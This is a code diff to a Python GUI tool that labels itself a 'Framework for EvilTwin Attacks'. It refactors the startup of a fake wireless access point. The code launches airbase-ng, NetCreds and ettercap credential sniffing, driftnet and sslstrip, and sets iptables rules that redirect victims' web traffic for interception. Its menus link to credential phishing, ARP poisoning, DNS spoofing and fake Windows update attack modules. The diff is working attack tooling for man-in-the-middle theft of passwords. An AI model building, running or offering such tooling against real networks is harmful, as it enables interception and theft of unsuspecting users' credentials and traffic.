@@ -33,7 +33,6 @@ from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
 from Modules.ModuleDnsSpoof import frm_DnsSpoof
 from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
 from Core.Settings import frm_Settings
-from Core.update import frm_Update
 from Core.about import frmAbout
 from twisted.web import http
 from twisted.internet import reactor
@@ -47,7 +46,7 @@ emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
 license     = 'MIT License (MIT)'
 version     = '0.6.3'
 date_create = '18/01/2015'
-update      ='27/07/2015'
+update      = '27/07/2015'
 desc        = ['Framework for EvilTwin Attacks']
 
 class Initialize(QMainWindow):
@@ -139,10 +138,12 @@ class SubMain(QWidget):
         self.module_arp     = frm_Arp_Poison()
         self.interface      = 'None'
         self.thread         = []
+        self.Apthreads      = {'RougeAP': []}
         self.MonitorImport  = frm_deauth()
         self.PortRedirect   = None
         self.Ap_iface       = None
         self.setGeometry(0, 0, 300, 400)
+        self.FSettings = frm_Settings()
         self.intGUI()
 
     def intGUI(self):
@@ -251,14 +252,10 @@ class SubMain(QWidget):
         Menu_extra= self.myQMenuBar.addMenu('&Extra')
         Menu_about = QAction('About',self)
         Menu_help = QAction('Help',self)
-        Menu_update = QAction('Update',self)
         #icons extra
         Menu_about.setIcon(QIcon('rsc/about.png'))
         Menu_help.setIcon(QIcon('rsc/report.png'))
-        Menu_update.setIcon(QIcon('rsc/update.png'))
         Menu_about.triggered.connect(self.about)
-        Menu_update.triggered.connect(self.show_update)
-        Menu_extra.addAction(Menu_update)
         Menu_extra.addAction(Menu_about)
 
         self.EditGateway = QLineEdit(self)
@@ -286,7 +283,9 @@ class SubMain(QWidget):
 
         driftnet = popen('which driftnet').read().split('\n')
         ettercap = popen('which ettercap').read().split('\n')
-        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0]]
+        dhcpd = popen('which dhcpd').read().split("\n")
+        dnsmasq = popen('which dnsmasq').read().split("\n")
+        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0],dhcpd[0],dnsmasq[0]]
         self.m = []
         for i in lista:
             self.m.append(path.isfile(i))
@@ -338,15 +337,11 @@ class SubMain(QWidget):
         self.Main.addLayout(self.form2)
         self.setLayout(self.Main)
 
-    def show_update(self):
-        self.Fupdate = frm_Update()
-        self.Fupdate.show()
     def show_arp_posion(self):
         self.Farp_posion = frm_Arp_Poison()
         self.Farp_posion.setGeometry(0, 0, 450, 300)
         self.Farp_posion.show()
     def show_settings(self):
-        self.FSettings = frm_Settings()
         self.FSettings.show()
     def show_windows_update(self):
         self.FWinUpdate = frm_update_attack()
@@ -377,6 +372,7 @@ class SubMain(QWidget):
         self.Fcredentials = frm_get_credentials()
         self.Fcredentials.setWindowTitle('Get credentials Phishing')
         self.Fcredentials.show()
+
     def logsnetcreds(self):
         self.FnetCreds = frm_NetCredsLogger()
         self.FnetCreds.setWindowTitle('NetCreds Logger')
@@ -411,31 +407,20 @@ class SubMain(QWidget):
                 self.selectCard.addItem(n[i])
 
     def kill(self):
-        for i in self.thread:
-            try:
-                i.stop()
-            except:
-                pass
-        try:
-            terminate = \
-            [
-                'killall dhcpd',
-                'killall dnsmasq'
-                'killall xterm',
-                'airmon-ng stop '+self.interface,
-                'echo \'0\' > /proc/sys/net/ipv4/ip_forward',
-                'iptables --flush',
-                'iptables --table nat --flush',
-                'iptables --delete-chain',
-                'iptables --table nat --delete-chain',
-                'ifconfig at0 down',
-            ]
-            for delete in terminate:
-                system(delete)
-        except:
-            pass
+        for i in self.Apthreads['RougeAP']:i.stop()
+        terminate = [
+        'killall dhcpd',
+        'killall dnsmasq'
+        'killall xterm',
+        'iptables --flush',
+        'iptables --table nat --flush',
+        'iptables --delete-chain',
+        'iptables --table nat --delete-chain',
+        'ifconfig %s down'%(self.Ap_iface),]
+        for delete in terminate:popen(delete)
         set_monitor_mode(self.interface).setDisable()
         self.Started(False)
+        Refactor.set_ip_forward(0)
         self.ListLoggerDhcp.clear()
 
     def delete_logger(self):
@@ -449,18 +434,18 @@ class SubMain(QWidget):
 
     def start_etter(self):
         if self.m[1]:
-            if search('at0',str(popen('ifconfig').read())):
+            if search(self.Ap_iface,str(popen('ifconfig').read())):
                 call(['sudo', 'xterm', '-geometry', '73x25-1+50',
                 '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                     '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
-                      'Logs/passwords', '-i', 'at0'])
+                      'Logs/passwords', '-i', self.Ap_iface])
         else:
             QMessageBox.information(self,'ettercap','ettercap not found.')
     def start_dift(self):
         if self.m[2]:
-            if search('at0',str(popen('ifconfig').read())):
+            if search(self.Ap_iface,str(popen('ifconfig').read())):
                 call(['sudo', 'xterm', '-geometry', '75x15+1+200',
-                    '-T', 'DriftNet', '-e', 'driftnet', '-i', 'at0'])
+                    '-T', 'DriftNet', '-e', 'driftnet', '-i', self.Ap_iface])
         else:
             QMessageBox.information(self,'driftnet','driftnet not found.')
 
@@ -475,24 +460,10 @@ class SubMain(QWidget):
                 'ifconfig %s mtu 1400'%(self.Ap_iface),
                 'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
             ],
-        'iptables':
+        'kill':
             [
                 'killall dhpcd',
                 'killall dnsmasq',
-                'iptables --flush',
-                'iptables --table nat --flush',
-                'iptables --delete-chain',
-                'iptables --table nat --delete-chain',
-                'echo 1 > /proc/sys/net/ipv4/ip_forward',
-                'iptables -P FORWARD ACCEPT',
-                'iptables -t nat -A PREROUTING -p udp -j DNAT --to %s'%(self.EditGateway.text()),
-                'iptables --append FORWARD --in-interface %s -j ACCEPT'%(self.Ap_iface),
-                'iptables --table nat --append POSTROUTING --out-interface '+str(Refactor.get_interfaces()['activated'])+' -j MASQUERADE',
-                'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port '+self.PortRedirect,
-                #'iptables -t -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ' +Refactor.get_interfaces()['IPaddress'],
-                'iptables -t nat -A POSTROUTING -j MASQUERADE',
-                'touch /var/run/dhcpd.pid',
-                'chmod 777 /etc/dhcp/dhcpd.conf',
             ],
         'dhcp-server':
             [
@@ -514,8 +485,9 @@ class SubMain(QWidget):
                 'server=8.8.4.4\n',
             ]
         }
+        Refactor.set_ip_forward(1)
         for i in self.SettingsAP['interface']:popen(i)
-        for i in self.SettingsAP['iptables']:popen(i)
+        for i in self.SettingsAP['kill']:popen(i)
         dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
         if dhcp_select != 'dnsmasq':
             with open('Settings/dhcpd.conf','w') as dhcp:
@@ -534,62 +506,80 @@ class SubMain(QWidget):
     def StartApFake(self):
         self.ListLoggerDhcp.clear()
         if geteuid() != 0:
-            QMessageBox.information(self,'Error permission',
-            'Run as root ')
+            QMessageBox.warning(self,'Error permission','Run as root ')
             return
         if len(self.selectCard.currentText()) == 0:
-            QMessageBox.information(self,'Error',
-            'Network interface not supported :(')
+            QMessageBox.warning(self,'Error','Network interface not supported :(')
             return
-
+        dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
+        if dhcp_select != 'dnsmasq':
+            if not self.m[3]:
+                QMessageBox.warning(self,'Error dhcp','isc-dhcp-server not installed')
+                return
+        else:
+            if not self.m[4]:
+                QMessageBox.information(self,'Error dhcp','dnsmasq not installed')
+                return
         self.interface = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
         self.config.xmlSettings('interface', 'monitor_mode',self.interface,False)
         # airbase thread
-        thr_airbase = ProcessThread(['airbase-ng',
+        Thread_airbase = ProcessThread(['airbase-ng',
         '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
         '-F', 'Logs/'+asctime(),self.interface])
-        thr_airbase.name = 'Airbase-ng'
-        self.thread.append(thr_airbase)
-        thr_airbase.start()
+        Thread_airbase.name = 'Airbase-ng'
+        self.Apthreads['RougeAP'].append(Thread_airbase)
+        Thread_airbase.start()
 
         # settings conf
         while True:
-            if thr_airbase.iface != None:
+            if Thread_airbase.iface != None:
                 self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
                 self.config.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
                 break
+
         # thread netcreds
-        ThNetCreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
+        Thread_netcreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
         self.config.xmlSettings('netcreds', 'interface',None,False)])
-        ThNetCreds.setName('Net-Creds')
-        self.thread.append(ThNetCreds)
-        ThNetCreds.start()
+        Thread_netcreds.setName('Net-Creds')
+        self.Apthreads['RougeAP'].append(Thread_netcreds)
+        Thread_netcreds.start()
         p = Process(target=self.CoreSettings,args=())
         p.start(),p.join()
 
         # thread dhcp
-        if self.config.xmlSettings('dhcp','dhcp_server',None,False) != 'dnsmasq':
-            Thdhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-cf','/etc/dhcp/dhcpd.conf',self.Ap_iface])
-            self.connect(Thdhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
-            Thdhcp.setObjectName('DHCP')
-            self.thread.append(Thdhcp)
-            Thdhcp.start()
+        selected_dhcp = self.config.xmlSettings('dhcp','dhcp_server',None,False)
+        if selected_dhcp == 'iscdhcpserver':
+            Thread_dhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-cf','/etc/dhcp/dhcpd.conf',self.Ap_iface])
+            self.connect(Thread_dhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
+            Thread_dhcp.setObjectName('DHCP')
+            self.Apthreads['RougeAP'].append(Thread_dhcp)
+            Thread_dhcp.start()
+            self.Started(True)
+        elif selected_dhcp == 'dnsmasq':
+            Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Settings/dnsmasq.conf','-d'])
+            self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
+            Thread_dhcp .setObjectName('DHCP')
+            self.Apthreads['RougeAP'].append(Thread_dhcp)
+            Thread_dhcp .start()
             self.Started(True)
         else:
-            Thdhcp = ThRunDhcp(['dnsmasq','-C','Settings/dnsmasq.conf','-d'])
-            self.connect(Thdhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
-            Thdhcp.setObjectName('DHCP')
-            self.thread.append(Thdhcp)
-            Thdhcp.start()
-            self.Started(True)
-
-
+            QMessageBox.information(self,'DHCP','dhcp not found.')
         # thread sslstrip
-        Thsslstrip = Threadsslstrip(self.PortRedirect)
-        Thsslstrip.setObjectName("Sslstrip")
-        self.thread.append(Thsslstrip)
-        Thsslstrip.start()
-
+        Thread_sslstrip = Threadsslstrip(self.PortRedirect)
+        Thread_sslstrip.setObjectName("sslstrip")
+        self.Apthreads['RougeAP'].append(Thread_sslstrip)
+        Thread_sslstrip.start()
+        iptables = []
+        for index in xrange(self.FSettings.ListRules.count()):
+           iptables.append(str(self.FSettings.ListRules.item(index).text()))
+        for rules in iptables:
+            if search('PREROUTING -p udp -j DNAT --to',rules):
+                popen(rules.replace('$$',str(self.EditGateway.text())))
+            elif search('--append FORWARD --in-interface',rules):popen(rules.replace('$$',self.Ap_iface))
+            elif search('--append POSTROUTING --out-interface',rules):
+                popen(rules.replace('$$',str(Refactor.get_interfaces()['activated'])))
+            else:
+                popen(rules)
     def create_sys_tray(self):
         self.sysTray = QSystemTrayIcon(self)
         self.sysTray.setIcon(QIcon('rsc/icon.ico'))
